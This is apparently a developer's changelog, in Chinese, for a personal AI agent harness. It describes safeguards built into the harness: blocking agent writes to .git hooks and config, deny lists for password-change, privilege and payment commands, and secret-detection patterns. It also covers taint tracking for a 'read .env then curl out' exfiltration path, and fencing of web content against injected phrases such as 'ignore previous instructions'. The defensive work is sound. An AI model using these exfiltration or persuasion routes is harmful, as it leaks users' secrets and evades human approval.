- `/audit` 在真实 56 个会话上返回 6 条，带 `tool` / `blocked_by` / `reason`；
- `/rules add` → `/rules` 显示 → `/rules remove` → 空态，闭环；
- 22 条测试覆盖空态、增删、deny 硬拒措辞、坏输入、`*.com` 被拒、规则替换语义、
  损坏文件拒写、按 decision 过滤删除。

全量 2261 passed / 3 skipped，ruff 通过。

## 飞书失败兜底通知可点击跳回（2026-10-27）

之前本地 Toast 只是一个「飞书发不出去」的静态提示——用户看到后第一件事就是想回飞书
看看到底怎么回事，但点了没反应，得自己找窗口。

### 实现

`notify.notify(...)` 新增 `url` 参数，写进 Toast XML：

```xml
<toast activationType="protocol" launch="https://open.feishu.cn/messenger/">
```

`activationType="protocol"` 是必须的——没有它 Windows 会把 `launch` 当应用参数
而不是链接。

### 安全过滤（这条路径的输入不可信）

Toast 内容是**错误信息**，可能包含远端返回的文本。允许任意 scheme 等于给了一个
「打开本地程序」的入口。所以 `_safe_launch` 只放行：

- `https://`
- `http://localhost`、`http://127.0.0.1`（本机控制台）

拒绝的：`file://`（打开任意本地文件/程序）、`ms-*`（系统设置页）、
`javascript:`/`vbscript:`、以及含换行/空字符的 URL（注入）。

另有**一个真实的坑**：`&` 在 XML 属性里必须转义，否则整条 Toast 失效。
`https://x.com/a?p=1&q=2` 不转义就发不出去，而且失败是静默的。走 `escape()`。

### 网关接线

`_local_alert` 是四处失败（回复、回合通知、心跳、定时结果）的统一出口，在那里
统一带上 `https://open.feishu.cn/messenger/`。

刻意**不拼具体 chat_id**：`open_chat_id` 只在当前应用租户内有效，拼错会打开空白
页，不如落到消息中心让用户自己选。

旧 notifier 不接受 `url` 参数时（测试替身）捕获 `TypeError` 退回不带链接的调用
——通知本身比链接重要。

### 验证

- 真实弹了两条 Toast（带链接与不带链接），都返回 `sent=True`；
- XML 断言：`activationType="protocol"` 与 `launch` 同时出现，无 url 时两者都没有；
- `&` 转义后 XML 合法；
- 5 种危险 scheme 全部被丢弃，4 种合法目标原样通过；
- 换行注入被拒。

测试 +9（`test_notify` 11 → 25？实际新增 8 条断言组）。全量 2275 passed /
3 skipped，ruff 通过。

### 未做

`--restart-on-crash`（常驻进程崩了要手动重启）与 `screen_capture` 接 PowerShell
worker（1.6s 里主要是 PNG 编码，进程开销占小头）——两者收益都不足以抵消改动风险。

## 审批面与拒绝文案的可用性（2026-10-27）

按「用户真的要点这个按钮」的角度走了一遍审批面，找到两个影响「敢不敢批」的问题。

### 1. 越界写只看得到路径，看不到内容

`detail('write', {'path': 'D:/out.txt', 'content': <5000 字>})` 原本输出：

    path=D:/out.txt, content=xxxxxxx…（214 字后被 summarize 截断）

两个问题叠加：

- **`summarize` 只留头部 200 字**，而文件的改动常常在末尾（追加配置、补日志行），
  审批人看到的是开头，判断不了这次写的是不是想干的事；
- **`detail` 拿到的是已截断的值**，我的第一版给它加了 300 字预览，实际拿到的
  最多 200 字，等于白写。

修法分两层：

- `summarize` 对 `write`/`edit` 的 `content`/`old_text`/`new_text` 保留**头尾**
  （各 400/200，共 600 字，标出省略字数）；
- `detail` 渲染成可读形态：`write D:/out.txt (5000 chars):` + 代码块预览；
  `edit` 渲染成 mini diff（`--- 原内容` / `+++ 新内容`，各取前 8 行）。

`edit` 之前只显示 `old_text=a=1, new_text=a=2`——没有文件路径、没有 diff 形状，
现在能一眼看出改的是哪个文件的哪几行。

### 2. 拒绝文案只说「不行」，不说「那怎么办」

模型收到 `Error: Dangerous command shutdown, please do not execute` 之后，最常见的
反应是换个写法再试一次。给每个拒绝码配一句可执行提示：

    Error: Dangerous command shutdown, please do not execute
    This command is on the deny list; use another tool or ask the user to run it.

覆盖 `deny_pattern` / `secret_path` / `secret_egress` / `system_path` /
`domain_denied` / `outside_workspace_write` / `sandbox_read_only` /
`invalid_url` / `invalid_path` / `deny_root_delete`。未知 code 不加提示（不猜）。

**首句一字不改**——它是对外契约，提示词规则、审批测试、旧日志都在断言它；新提示
是追加的第二行。

### 更新了 6 处既有断言

这些断言写死了旧行为，属于「改动是对的、断言过时了」：

- `content` 摘要上限 300 → 700（实际 600 字 + 省略标记）；
- `'5000' in content` → `'省略' in content`（不再有 `… (5000 chars)` 尾巴）；
- 四处 `== 'Error: access to protected path (...)'` → `.startswith(...)`
  （现在后面跟着 hint 行）；
- `write` 无 content 时的展示：`path=a.txt` → `a.txt（无内容摘要）`。

### 测试

`test_approval_view.py` 17 条（+6）：write 内容预览、长内容留头尾且总长受限、
edit 的 diff 形状、`replace_all` 标注、`summarize` 也留头尾、短内容不动。

全量 2281 passed / 3 skipped，ruff 通过。

## 全面可用性检查：发现一个真实漏洞（2026-10-27）

按「用户/模型实际会碰到什么」把所有交互面走了一遍：审批展示（24 个工具逐个）、
错误提示、截断提示、路径类错误、飞书 friendly_error 覆盖度。

### 最重要的发现：`.git/` 被当普通工作区

逐个工具试错时撞到的：`write('.git/x', 'hi')` **成功了**。

`classify_path` 原本只判秘密文件（`.env` / 私钥）与系统目录，`.git` 在
工作区内，于是被归为 `PATH_WORKSPACE`，而默认档下工作区内写改**免审**。
这意味着模型可以：

- 改 `.git/config` 的 remote，把之后每次 push 引到别处；
- 写 `.git/hooks/pre-commit`，在下一次 commit 时执行任意脚本；
- 动 `.git/index` / objects，直接破坏仓库。

它比 `.github/workflows`（要 push 才生效）、`setup.py`（要安装才执行）危险得多
——**改完立即生效，不需要任何额外动作**。所以只拦 VCS 目录，不扩大其它构建配置。

修法：`_inside_vcs()` 按**路径段**匹配 `.git` / `.hg` / `.svn`，命中归
`PATH_SECRET`（读写都硬拒）。段匹配保证 `git-notes/` 这类只是名字像的目录不受
影响——有测试盯着。

写 `.git/config`、`.git/hooks/pre-commit` 现在都被硬拒，正常文件仍可写。

### 顺带修的三个体验问题

**1. 补丁审批看不到影响面**

`apply_patch` 的 detail 原本把补丁原文摊上去（`summarize` 截到 215 字）。审阅
补丁的人第一眼要看的是**动了几处、哪些新增哪些删除**，而不是补丁的开头两行。

现在先给摘要：

    patch touches 3 path(s):  (+3/-1 lines)
      add a.txt
      update b.py
      delete c.md

解析不出文件头时退回内容预览（不显示空白）。

统计 `+/-` 行数时踩了个小坑：`+++`/`---` 在 `startswith('+')/('-')` 下会被
算成增删，要先排除。另外我最初把预期写成 `+2/-1`，实际 `+3/-1` 才对
（`+hello`、`+world`、`+x = 2` 三行）——**是测试预期错了，不是代码错了**。

**2. 读目录给出原始 errno**

`read('.')` 返回 `[Errno 13] Permission denied: 'D:\harness-agent'`。用户看不出
「这是目录」。改成 `is a directory; use ls to list it, or glob/grep to search inside`。

**3. `secret_path` 的提示只提「读」**

`.git/config` 被拒时提示是 "ask the user instead of reading it"，但这次是**写**。
改成不区分方向的措辞：`Protected path (secret files and version-control internals
are off limits); ask the user to handle it.`

### 检查过、确认没问题的

| 面 | 结论 |
|---|---|
| 24 个工具的审批展示 | 桌面/删除/剪贴板/域名/写文件的措辞都能读懂 |
| 未知命令拼错 | 有编辑距离建议 |
| 参数缺漏 | 打印完整用法 |
| 大输出截断 | 给出 `offset=` 续读提示 |
| 飞书 friendly_error | 402/401/429/超时/turn_busy 都有可执行建议，未知错误原样透出（不编造） |
| 空状态 | 说明默认行为，不是空白 |

### 测试

`tests/test_usability_regressions.py` 14 条：补丁摘要（含 move、无法解析时回退、
增删统计）、VCS 目录归秘密区（5 个路径）、形近目录仍属工作区（3 个）、
真实工具拒绝写 `.git`、读目录/读文档后缀的下一步提示。

全量 2295 passed / 3 skipped，ruff 通过。

## 清理 .git 残留 + /status 分组（2026-10-27）

### `.git/` 里有 23 个不该存在的文件

`git fsck` 通过（只有 dangling commit，是 amend/rebase 的正常残留），但列目录时
发现 `.git/` 里躺着：

    cache1.txt cache2.txt d1..d8.txt dump.py imp.txt lg.txt lg2.txt log.txt
    py2.txt py3.txt s1.txt s2.txt st.txt st2.txt tmp_pytest.txt tmp_tests_diff.txt

内容分别是历史的 `git log` 输出、pytest 输出、脚本 dump——是过去调试时 shell
重定向写错路径留下的（不是代码缺陷，代码里搜不到这些名字）。

全部删除，`.git/` 恢复成标准内容。删除前后核对：HEAD 未变、`git status` 干净、
`git fsck` 无 corruption。

### `/status` 从 15 行平铺改成两组

新加的能力（域名/规则/凭据/删除/限额/浏览器）都和核心状态（会话/工作区/档位）
平铺在一起，15 行下来重点被埋掉了。改成：

- **已启用**：带状态单独一行（屏幕截图几张多大、域名允许几个拒绝几个、
  规则几条、凭据几项、限额多少）；
- **未启用**：压成一行逗号分隔。

现在一眼能看出「开了什么、没开什么」，而不是逐行读。

### 顺手修的一个真问题

分组过程中发现：**规则文件加载失败时，`/status` 完全看不到**——因为「用户规则」
只在有规则时才进「已启用」。而规则坏了意味着所有 allow/deny 一夜失效，用户却
以为它们在生效。

改成无条件显示警告行，并把 YAML 的多行解析错误**压成单行首句**（完整错误看
`/rules`）——直接嵌进 `/status` 会把输出撑乱。

### 更新 4 处断言

- `test_cli_output`：`'屏幕工具：开'` → 分组后的 `'屏幕：开'`；
  关闭态改成断言出现在「未启用」那一行之后。
- `test_rules_integration`：`'规则文件：无'` → 出现在「未启用」行；
  `'允许 1'` → `'用户规则：2 条'`（详情移到 `/rules`）。

全量 2295 passed / 3 skipped，ruff 通过。

## 审批卡片显示工具中文名（2026-10-27）

卡片上写 `**#1 · desktop_action**`，非技术用户看不出这是在动键鼠；但只写中文
又不好对照日志/文档。改成两者都给：

    **#1 · 操作键鼠 (desktop_action)**
    **#2 · 删除（进回收站） (delete_paths)**

`approval_view.tool_label()` 一处定义，审批卡片与 CLI 提示共用。没登记的工具
原样显示（不编中文名）——MCP 工具名是用户自己配的，编一个反而误导。

### 顺带确认过的，没问题

- **并发写会话**：4 线程各写 20 条，81 条事件 seq 完全连续、零错误；
- **内存**：60 次 spawn 后增量 0 MB，没有句柄泄漏；
- **时间显示**：刚刚/分钟/小时/天/一周外日期、未来时间、None 都正确降级；
- **会话损坏**：尾部截断容忍（读出 1 条），中间坏行报
  `invalid JSONL event at line 2`，位置明确。

### 更新 2 处断言

`test_feishu_approval_batch`：`'#1 · bash'` → `'#1 · 执行命令 (bash)'`。

全量 2298 passed / 3 skipped（291s），ruff 通过。

## 文件错误提示统一 + worker 启动超时修复（2026-10-27）

### 1. 文件系统错误给下一步动作

`read`/`write`/`edit` 原本对 `FileNotFoundError` 等一律 `return f'Error: {e}'`，
用户看到的是 `[Errno 2] No such file or directory: 'D:\a\b'`——信息没错，但不说
下一步。抽出 `_fs_error(exc, action, path)` 统一转：

| 异常 | 输出 |
|---|---|
| `FileNotFoundError` | `file not found: <path> (check the path, or use ls/glob to locate it)` |
| `IsADirectoryError` | `<path> is a directory; use ls to list it` |
| `NotADirectoryError` | `part of <path> is not a directory` |
| `PermissionError` | `permission denied reading <path> (locked or read-only)` |
| 磁盘满（errno 28） | `no space left on device while <action> <path>` |
| 其它 | 保留原文（排障时那行才是关键） |

### 2. worker 启动超时会把自己杀掉（真实 bug）

`test_ps_worker::test_timeout_stops_the_worker` 在全量跑时偶发失败，单跑 3 次
都过——但它每次要 7.9 秒，说明对时序敏感。查下去发现是**真 bug**：

`_wait_ready()` 用 `_roundtrip(ping, timeout=2.0)` 等启动，而 `_roundtrip` 在超时时
会 `self._stop()` **杀掉进程**。于是机器繁忙、PowerShell 编译脚本头超过 2 秒时，
ping 超时把正在启动的 worker 杀了，报「exited during startup」——而它其实只是慢。

修法两处：

- `_roundtrip(..., kill_on_timeout=False)`：启动阶段的 ping 超时**不杀进程**，
  只让外层循环继续等（真正的卡死由 `_wait_ready` 的总预算兜底）；
- ping 超时从固定 2s 改成 `min(8, max(1, 剩余预算))`：给繁忙机器留余量。

修复后连续 3 次冷启动稳定在 1.66–1.76s 成功。

### 3. 顺带确认没问题的

- **路径特殊字符**：空格、中文、分号、美元符、反斜杠、UNC 风格都正确；
  `~` 会展开成用户目录（不存在时报 file not found 是对的）；
- **glob**：`*.py` 只匹配当前目录（标准语义）、`**/*.py` 递归、
  `*.PY` 在 Windows 上大小写不敏感——都符合预期，我一开始误判成 bug；
- **grep**：正则转义、非法模式（`*`、`[`、`(unclosed`）都给出明确错误；
- **22 个真实会话**的历史重建全部自洽，无孤儿 tool 消息。

全量 2302 passed / 3 skipped（447s），ruff 通过。

### 关于「测试卡住」

这几轮反复出现「超时中断」，实际原因是**全量耗时从 5 分钟涨到 7.5 分钟**
（用例数 1690 → 2302），而我的超时阈值没跟上。改用后台运行 + 落盘日志后
一次跑通，无失败。后续跑全量建议 `nohup ... &` 或给足 900s 以上。

## 测试分组：`-m "not slow"` 快速回归（2026-10-27）

全量 2302 条要跑 3–7 分钟（取决于机器负载），每次改动都等这么久不现实。加
`slow` marker，把「因为重导入或真实 OS 往返而必然慢」的用例标出来：

| 用例 | 耗时 | 原因 |
|---|---|---|
| `test_lark_transport_sends_text` | 13–19s | `import lark_oapi` 本身 13.19s |
| `test_timeout_stops_the_worker` | 5.5s | 真实 PowerShell 重启 |
| `test_cpu_time_limit_terminates_busy_loop` | 4.8s | 真烧 CPU 到限额 |
| `test_poll_does_not_rerender_when_nothing_changed` | 4.1s | 真实网关轮询 |
| `test_process_count_limit_blocks_fork_bomb` | 2.2s | 真 spawn 子进程 |
| `test_sendinput_struct_is_64bit_sized` | 2.0s | 真实 PowerShell 往返 |

效果：

- `pytest -m "not slow"` → **2295 passed，160s**（跳过 7 条）
- `pytest` → **2302 passed，183–335s**（跑全部）

### 一次失败的重构尝试（已回滚）

想顺手把 `test_harness_app.py` 里 26 处 `for _ in range(80): pause; sleep(0.02)`
换成按墙钟等待（固定轮数 = 固定 1.6s 预算，机器繁忙时偶发失败）。

用正则批量替换，结果：6 处替换把循环体里的变量赋值丢了，直接 `NameError`；
另有 2 处谓词太弱（原来等「行数非零」，实际要等「最后一条已渲染」）。
改到自己都数不清改了几处，**整体回滚**。

教训：**正则批量改测试文件的风险高于收益**。那几条偶发失败本来就少（4 轮里
1–2 次），而一次改坏 6 条是确定性的损失。真要修应该手工逐条改，或者干脆
接受偶发、靠重跑兜底。

全量 2302 passed / 3 skipped，ruff 通过。

## 找到两条偶发失败的共同根因：回合槽状态跨用例残留（2026-10-27）

`test_turn_slot_released_after_turn` 与 `test_delete_requires_typed_confirmation`
各约有 25% 概率随机失败，单跑必过。之前一直当作「Textual UI 时序敏感」处理，
这次查到了真正的根因。

### 根因

`src/turn_coordinator.py` 的 `_DEPTH` / `_OWNER` / `_UNLOCK` 是**模块级全局**，
`acquire()` 的逻辑是：

```python
with _STATE:
    if _DEPTH:                 # ← 有人已经持槽
        if _OWNER != ident: raise TurnBusy(...)
        _DEPTH += 1            # 同线程 → 只加嵌套计数，不申请 OS 锁
        return TurnSlot(release_nested)
    manager = exclusive_file_lock(...)   # 真正的抢锁只在这里
```

如果某个用例没走到 `release()`（异常、提前 return、pytest 中途打断），
`_DEPTH` 就留在 1。**下一个用例**在 acquire 时命中「同线程重入」分支——它拿到
一个空槽、**回合根本没跑**，断言自然失败。

这解释了为什么「单跑必过、连跑偶发」：失败取决于前一个用例有没有干净退出。

### 修法

- `turn_coordinator.reset_for_tests()`：清 `_DEPTH`/`_OWNER`/`_UNLOCK`，并关掉
  残留的 OS 锁（不关会占着文件句柄）。
- `conftest` 加 autouse fixture，每个用例前后都调它。

### 效果

`test_harness_app.py` 连跑 4 轮：**78 passed × 4，零失败**；而且耗时从 34s 降到
**18s**——原来有 10s 是在等锁超时。

补两条回归：`test_reset_recovers_from_a_leaked_slot`（故意不释放再 reset）、
`test_reset_is_idempotent`。

### 一条教训

之前我把这两条当成「UI 时序问题」，还想用正则批量改固定轮询——那是**治错了病**。
真正的信号是「单跑必过、连跑偶发」，这类模式优先怀疑**跨用例状态泄漏**，
而不是时序。批量改测试反而会引入确定性破坏（上一轮已经踩过）。

全量 2304 passed / 3 skipped，ruff 通过。

## 复查模块级全局状态的测试隔离（2026-10-27）

上一轮发现回合槽状态跨用例残留（`_DEPTH`）导致偶发失败，顺着这条线把所有
模块级可变全局过了一遍，找同类问题。

### 方法

先筛出模块级可变容器/计数器（排除常量、frozenset、编译后的正则）：

    background_task._bg_counter      agent_runtime._summary_cache
    cron_scheduler._idle_cache       line_repl._RENDERER_ATTACHED
    llm_config._settings_cache       llm_config._clients
    net_grants._CACHE                mcp_bridge._clients / _shutdown
    project_context._cache           notify._last_attempt
    memory._FRONTMATTER_CACHE        ps_worker._workers
    idle._cache                      skill_system._last_signature
    sandbox._STATE / _ENV_BLOCK_CACHE   turn_control._ACTIVE_TOKENS
    tool_todos._TODOS                workspace_diff._REPO_ROOTS
    rules._CACHE                     turn_coordinator._DEPTH
    tool_dispatch._tool_output_seq

再逐个核对 conftest 是否隔离。

### 找到并修的两个缺口

**1. `credentials` 没有隔离——测试结论依赖本机状态**

`/status` 里有一行「凭据加密：N 项」。不隔离的话：

- 本机迁移过凭据 → 测试看到「加密（3 项）」
- 换个没迁移的机器 → 看到明文 `.env`

**同一个测试在两台机器上结论不同**，这类问题最难查（CI 上过了、本地不过）。
加 `_isolate_credentials` fixture 把 `store_path` 指到 `tmp_path`。

**2. `ps_worker._workers` 没有隔离——真实进程泄漏**

`get_worker` 是进程级单例注册表。`test_get_worker_is_singleton_per_name` 注册完
不走 shutdown 的话，**后面每个用例都带着一个常驻 PowerShell**：既拖慢，也可能
因为名字撞车拿到别人的 worker（`ECHO_SCRIPT` 里的 op 对不上，报「unknown」）。
加 `_shutdown_ps_workers` fixture，前后各 shutdown 一次。

### 评估后判定不用处理的

| 状态 | 理由 |
|---|---|
| `workspace_diff._REPO_ROOTS` | 按路径分 key，不同用例的 tmp_path 天然隔离 |
| `tool_todos._TODOS` | 现有测试已手动 clear（4 处），搬到 conftest 收益小于改动 |
| `sandbox._STATE` / `_ENV_BLOCK_CACHE` | 只缓存「工作区能否打标」，按路径分 key |
| `rules._CACHE` / `net_grants._CACHE` | 已按 (路径, mtime, size) 缓存，且有 conftest 隔离 |

### 测试

`test_cli_output` 新增 1 条：确认 `store_path` 在用例 tmp_path 里、且未迁移状态
下 `exists is False`（不依赖本机是否迁移过）。

全量 2305 passed / 3 skipped，ruff 通过。

## MCP 桥的 shutdown 不可逆：写进文档而不是加 fake 兜底（2026-10-27）

继续查全局状态时注意到 `mcp_bridge.shutdown_mcp()` 是个**不可逆**操作：
`_shutdown=True` 之后 `register_mcp_tools` 永久返回 `[]`。

### 试过加 conftest 兜底，撤掉了

第一版加了 autouse fixture：用例结束后若发现 `_shutdown` 被置 True 就报错，
指出是哪一层漏了保护。结果**误报了**——autouse fixture 的收尾早于
`monkeypatch` 的恢复，正常用 monkeypatch 保护的写法也会被抓住。

改成「只复原不复原告警」后又验证了一遍：**仅复位标志位不够**——
事件循环已经 `stop`，`register_mcp_tools` 仍返回 `[]`，线程退出还需要时间。
这条 fixture 修不干净，反而给人「已经兜底」的错觉，**直接删掉**。

### 改成写进文档

`shutdown_mcp` 的 docstring 现在明确写出：

- 不可逆，一个进程只能关一次；
- 仅复位 `_shutdown` 不够（loop 已停）；
- 测试要验证这条路径，必须整段 monkeypatch（`_shutdown`/`_clients`/`_loop`/
  `_run_async` 全替换），不能对真实的桥调用——那会让同进程后续所有 MCP 用例
  拿到空工具表。

现有的 `tests/test_mcp_lifecycle.py` 本来就是这么写的，所以这个坑一直没被踩到。
文档化比加一个修不干净的 fake 兜底诚实。

### 顺带确认

`test_mcp_lifecycle` 与 `test_mcp_telemetry` 两种执行顺序都通过（前者用
monkeypatch 保护了 `_shutdown`），当前没有实际泄漏。

全量 2305 passed / 3 skipped，ruff 通过。

## 第三轮规划：对照 Codex / dots / Muse 找关系层缺口（2026-10-27）

前两轮把「能做什么」补齐了（48 个工具、权限分层、常驻、审计）。这次换了问法：
**把三家 2026 年的 personal agent 摊开对照，我们缺的是什么。**

### 关键发现：缺的不是能力，是「长期关系」

一次 grep 就确认了三件事：

1. **记忆没有工具入口**。`src/memory.py` 有 `write_memory_file` /
   `read_memory_index` / `list_memory_files` / `select_relevant_memories`，机制
   完整；但 `tool_schemas.TOOL_SCHEMAS` 里**没有任何记忆工具**。模型只能靠
   `write` 往 memories/ 写 md 文件——等于「得先知道目录结构才会用」。
2. **主动性只有摘要**。`heartbeat.py` 开头那句写得很清楚：「初始形态是只读巡检
   （任务板、工作区最近改动、待审批数量），**不需要模型参与**」。cron 是按用户
   给的 prompt 跑。所以「agent 自己想到该做什么」这件事完全不存在。
3. **委托边界没有硬编码清单**。有 `SCHEDULED_FORBIDDEN_TOOLS`、
   `PROTECTED_CODES`（按工具/策略码拦），但没有「改密码这类永远不代做」的业务
   级清单——这正是 dots 写在产品里的东西。

### 三家的一手资料（都读了原文，不是二手总结）

**Codex 2026-04**（「Codex for (almost) everything」）：background computer use
（自己光标、多 agent 并行不干扰用户）、**memory preview**（记住偏好/纠正/花时间
才拿到的信息）、**automations 复用线程**（保留上下文、跨天跨周自己醒来）、
**主动提议**（用项目/插件/记忆的上下文提议今天从哪开始）。90+ plugins。

**dots**：自己的云电脑 + 浏览器；**主动性=只读工具**（不能发消息/改内容/控浏览器
或电脑）；Custom Rules 三态；auto-review；**改密码永远留给人**；可随时打开它的
电脑看工作过程；凭据代填但模型看不到。

**Muse**：每人一台 Secure VM；**Sentinel 监督 agent**（系统级隔离，Muse 的一切
出网都要它批准）；**凭据代换**（能用不能看，支付用一次性卡号限商户/金额/时间）；
完整审计 + 每次购买显式批准；可以「忘记」。

**反面对照**：TIME 2026-10 调查发现 Muse 每小时更新用户与联系人的「档案」、
推断未说出口的目标，且指令里明确要求「不要告诉用户原始消息可能仍可见」。
→ 对我们的意义：**长期记忆必须可查看、可删除，否则就是黑箱**。

### 规划内容

写进 `docs/PERSONAL_AGENT_ROUND3.md`，五项：

- **M1 记忆一等公民**（3 天，默认开）：`remember` / `forget` / `recall` 三个工具，
  type 收窄成 preference/fact/correction/context；`forget` 必须逐次审批
  （删除比写入更需确认）。这是 M2 的前置。
- **M3 委托硬边界**（1 天，默认开）：`src/never_do.py` 硬编码清单——改密码、
  支付、2FA、把凭据输入表单、同意法律条款。命中**直接拒绝**而不是走审批：
  审批可以被模型说服，硬拒不行。
- **M2 只读主动建议**（4 天，**默认关**）：严格按 dots「主动性只读」原则，
  工具面裁成只读白名单（不是靠提示词），建议进卡片带「开始做」按钮，
  点了才进正常回合。用户连续忽略 3 次自动降频。
- **M5 跨渠道接续**（2 天，默认开）：最近活跃会话跨渠道共享，手机上发消息默认
  接上 TUI 停下的会话。
- **M4 可观察面**（2 天）：`/memories` 卡片、`/proactive` 历史、三类审计事件。

明确不做：云电脑、Sentinel 式双 agent、自动代填密码、支付、每小时用户档案、
4,000 app 清单。

### 为什么这个顺序

先 M1 + M3：一个补长期关系、一个补硬边界，都不碰主动性，风险最低；而且 M1 是
M2 的前置（没有记忆的主动建议只能是泛泛而谈）。**M2 最后做且默认关闭**——主动性
最容易做成品味灾难，先有真实使用数据再决定开不开。

全量 2305 passed / 3 skipped，ruff 通过。

## 第三轮实施：N6 + N5 + M1 + N1（2026-10-27）

按「先堵实测确认的漏洞，再补关系层」的顺序落地四项。

### N6 外部内容不可信围栏（src/untrusted.py）

`web_fetch` 和 MCP 结果由第三方控制，模型无法区分「用户让我做的事」和「网页里
一句 ignore previous instructions」。加 `<untrusted source="…" kind="…">` 围栏。

三个设计取舍：
- **不改内容本身**：正文逐字保留。转义会破坏代码块、正则和 diff。
- **不转义正文**：正文里本来就有 `<untrusted>` 会出现假围栏，但转义的代价更大
  （代码全失真）。靠提示词说明"只有最外层可信"。
- **标签可关闭**：`HARNESS_UNTRUSTED_MARK=0` 退回旧行为。

接入点：`tool_exec.fetch_url`（正文进围栏，URL/Content-Type 头留外面）、
`mcp_bridge._make_sync_wrapper`（正常结果包，`MCP error:` 串不包——调用方靠
前缀分类）。失败的是两个 MCP 遥测测试断言全等，改成断言正文在内。

系统提示加一句说明（`prompt_assembly`），否则模型会把围栏当普通 XML 噪音。

### N5 污点出网（src/taint.py）

实测确认的缺口：`bash cat .env` 是放行的（exec_policy 里写明这是有意权衡，
`grep .env docs` 误伤面大），配套的 `secret_egress` 只在**同一条命令**里同时
出现秘密文件和出口命令时才升级。所以跨命令这条路是通的：

    bash cat .env      -> allowed            # 内容进上下文
    bash curl -d ...   -> opaque_command     # 不知道刚读过什么

污点机制把因果补上。六个决定：

1. **只升级不禁止**——读过记忆之后要联网是合理的，缺的是让审批人看到因果。
2. **回合级而非全局**——跨回合累积会让每轮都变红，几次之后用户就无脑通过，
   比不做更糟。`agent_loop` 开头 `taint.reset()`。
3. **单向不可洗白**——命中即保持，不因为后面读了公开文件而清除（Muse 同语义）。
4. **ContextVar 隔离**——父上下文污点不漏给线程池里的无关任务（有测试）。
5. **记来源不只记布尔**——卡片要能写"读过 .env、读过 memories/"，否则用户看到
   的只是一个莫名其妙的升级提示。
6. **优先级高于会话白名单与 LLM 审查官**——一次域名预授权不是读过密钥后的放行
   依据；审查官看的是"这条命令像不像常规开发操作"，它看不到本回合前面读过
   什么，也就无权放行外发。

打点挂在 `enforce` **入口**而不是各 return 点：读取路径分散在 read/bash/grep/
read_document 和无头 worker 里，逐个改容易漏（包括以后的子代理），而漏一处
等于整条链路失效。

判定只靠文件名/路径，不靠内容：内容级检测（"看起来像密钥"）误报多，还会诱使
后续代码去做正则猜测，反而不可靠。

### M1 记忆的显式入口（src/tool_memory.py）

工具数 48 → 51。`remember` / `forget` / `recall`。

- type 收窄成四个语义枚举（preference/correction/fact/context）。
- `forget` 同时接受记忆名与文件名：模型手里通常只有 remember 返回的文件名，
  而用户在界面上看到的是 name。
- `recall` 无命中时给下一步（换短关键词或空 query），而不是只说"没找到"。
- 三者都要审批：写记忆影响之后每个会话；删记忆不可逆（不像 delete_paths 有
  回收站），`approval_policy=never` 也不该默默删。
- `recall` 登记进 `READ_ONLY_FILE_TOOLS`。

**踩到的坑**：中文名经 `_SLUG_RE`（只留 `a-z0-9._-`）会被清空，退化成
`memory-<时间戳>.md`。这是既有行为（自动抽取也这样），没改它——改 slug 规则会
影响既有记忆文件名。工具层同时支持按 name 和文件名删，所以可用。

**循环导入**：`tool_memory` → `memory` → `llm_route` → `harness` 会搅乱
hooks/tools 的导入顺序（`tools` ↔ `hooks` 本来就是环，靠 harness 先导入解开）。
`tools.py` 里改成惰性导入，并在注释里写明原因。

### N1 落盘前秘密脱敏（src/memory_redact.py）

`_render_memory` 之前对正文零处理。记忆是长期状态，一条 `.env` 内容被记下来后
每次会话都会被召回——泄露面比会话本身大得多（会话能删，记忆会一直跟着）。

- 已知形态：私钥块、`sk-`/`ghp_`/`AKIA`/`xox`/`AIza`/JWT/Bearer
- 通用 kv：`api_key=`、`password:`、`password is`
- 中文键名：密码是/密钥是/令牌为
- 已知真实凭据值精确替换（比形态匹配可靠：值一定对）
- 替换成 `[redacted:kind]`，保留位置信息——否则"数据库密码是 XXX"会变成
  "数据库密码是"，读起来像记忆被截断了
- **故意不碰自然语言**：「token 预算是 8000」不该被脱敏（有测试守住）
- 命中写审计 `memory_redacted` + 打印：脱敏是静默篡改用户要记的东西

### 验证

- 新增 `test_untrusted.py` (10)、`test_taint.py` (16)、`test_memory_tools.py` (31)
- 工具快照同步（ORDER + SHA1）：`9abdb4ef1756…`
- 全量 **2355 passed / 3 skipped / 7 deselected**（270s），ruff 通过
- 端到端手验：密钥不落盘（`sk-` 未出现在磁盘）、污点链路（读 .env → 出网需
  升级 → 重置后清空）、围栏格式正确

## 第三轮实施：M3 第四档 MUST_DO_SELF（2026-10-27）

### 为什么是「第四档」而不是「再加一类审批」

现有三档是 allow / ask / deny。`ask` 的根本问题是**它会被说服**：模型换一种说法
（"用户已经同意了"、"这是测试环境"）就能把审批人说动。而改密码、转账、输入验证码
这类事根本不该进入讨论。

dots 把它写在产品里：

> Certain sensitive tasks, such as changing a password, **always stay with you**.
> **Built-in safety requirements always apply**（Custom Rules 不能覆盖）

Muse 的对应思路是 assume breach：不问模型会不会被说服，只问它被说服了能造成什么。

### 实现（src/never_do.py）

- `check(tool, args)` 纯文本/参数匹配，**不读环境、不读规则**——这一档的定义就是
  无条件。
- 挂在 `enforce` 的**最前面**，在 `evaluate_call` 之前。这样它天然绕过档位、规则
  文件、会话白名单、LLM 审查官，也**不进审批队列**（排队等来的"是"同样是错的）。
- `Decision.action` 仍只有三态（结构不变），「不可覆盖」由 `enforce` 提前返回保证。

### 清单

改密码（passwd/chpasswd/net user/Set-ADAccountPassword）、提权
（net localgroup administrators）、改 sudoers、2FA 生成（oathtool）、支付转账
（stripe/paypal/alipay/venmo + pay/charge/transfer/refund/send）、
`desktop_action` 往密码框打字、`clipboard_write` 复制凭据。

**故意没做**：同意法律条款/签合同。原因是纯文本匹配误报太高（"同意"两字在日常
对话里到处都是），需要结构化表单识别才有意义。代码里用空的 `_FORM_RULES` 显式
记录了这个取舍，不是遗漏。

### 误伤控制

有 8 条「不该拒」的测试守住边界：
`grep password docs/`、`echo "my password is in the vault"`、
`git log --grep=payment`、`npm install` 等都要放行。关键是**讨论密码 ≠ 改密码**，
所以规则只认命令动词和参数位置，不做全文关键词匹配。

### 核心验证

`test_enforce_refuses_even_with_danger_full_access_and_never` 构造了最宽松组合：
`danger-full-access` + `approval_policy=never` + 会话白名单命中 + 审批都返回同意，
断言 ① 仍然被拒 ② **审批函数被调用 0 次**。这是第四档存在的意义所在。

### 可观察性

`/status` 的「已启用」新增一行「不可代做：10 类（改密码/支付/2FA 等，不可绕过）」，
并补上 N5/N6 的状态行——用户应该能一眼看到自己受哪些保护。

新增 test_never_do.py (33)。全量 **2388 passed / 3 skipped**（184s），ruff 通过。

## 第三轮实施：N3 逐会话记忆开关 + N2 记忆老化（2026-10-27）

### N3 逐会话开关（src/memory_scope.py）

